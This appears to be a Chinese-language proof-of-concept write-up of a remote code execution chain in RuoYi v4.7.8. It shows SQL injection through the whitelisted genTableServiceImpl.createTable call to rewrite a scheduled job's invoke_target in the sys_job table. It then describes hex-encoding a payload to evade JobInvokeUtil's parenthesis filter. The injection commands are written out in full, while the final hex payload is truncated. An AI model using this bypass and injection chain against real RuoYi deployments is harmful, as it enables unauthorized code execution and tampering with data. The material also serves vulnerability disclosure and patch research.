## RUOYI-v4.7.8存在远程代码执行漏洞

## SQL
在补丁中，采用了黑名单和白名单的策略。

![image](https://github.com/wy876/POC/assets/139549762/956ab54c-b644-46c9-8e9a-721c4fc7e2c3)

不过，我通过使用白名单类成功绕过了它，并成功进行了 SQL 注入。

`genTableServiceImpl.createTable('SELECT 1 FROM 'Hack By 1ue';')`


![image](https://github.com/wy876/POC/assets/139549762/15edcc06-576b-4421-b99a-c10b837d3ac3)

`genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')`
修改表数据成功job_id

## RCE

JobInvokeUtil由于调用时字符串中不允许有括号，所以我将原作业表中特定作业的参数值修改为十六进制（绕过防御检测），从而启用了另一个远程代码执行（RCE）的定时任务

![image](https://github.com/wy876/POC/assets/139549762/1e58dc92-fd84-4c1d-bc92-c7c4e803dfdf)

`genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a61... WHERE job_id = 2;')`

![image](https://github.com/wy876/POC/assets/139549762/bd28ba04-2e62-47ef-8142-68819931ea0b)

作业的 invoke_target 已更改

![image](https://github.com/wy876/POC/assets/139549762/71ffcbdc-fa38-4249-a878-c47abbed1ed2)


## 漏洞来源
- https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC?tab=readme-ov-file
